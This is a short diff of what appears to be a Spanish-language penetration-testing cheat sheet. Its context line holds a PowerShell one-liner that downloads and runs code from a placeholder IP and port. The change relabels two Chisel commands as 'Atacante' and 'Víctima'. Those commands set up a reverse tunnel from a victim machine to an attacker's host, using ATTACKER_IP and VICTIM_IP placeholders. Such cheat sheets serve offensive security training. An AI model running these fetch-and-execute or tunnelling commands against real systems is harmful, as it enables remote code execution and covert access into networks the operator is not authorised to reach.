@@ -19,12 +19,12 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.
 
 ## Chisel
 
-Servidor
+Atacante
 ```
 ./chisel server --reverse -p ATACKER_PORT
 ```
 
-Cliente
+Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
